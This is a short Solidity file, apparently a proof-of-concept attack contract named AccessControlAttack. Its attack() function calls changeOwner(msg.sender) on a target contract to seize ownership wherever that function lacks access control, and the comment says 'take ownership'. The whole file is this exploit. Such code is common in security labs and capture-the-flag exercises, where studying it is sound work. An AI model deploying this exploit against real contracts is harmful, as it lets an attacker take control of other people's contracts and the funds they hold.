// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IAccessControl {
    function changeOwner(address newOwner) external;
}

contract AccessControlAttack {
    IAccessControl public target;

    constructor(address _target) {
        target = IAccessControl(_target);
    }

    function attack() public {
        // take ownership
        target.changeOwner(msg.sender);
    }
}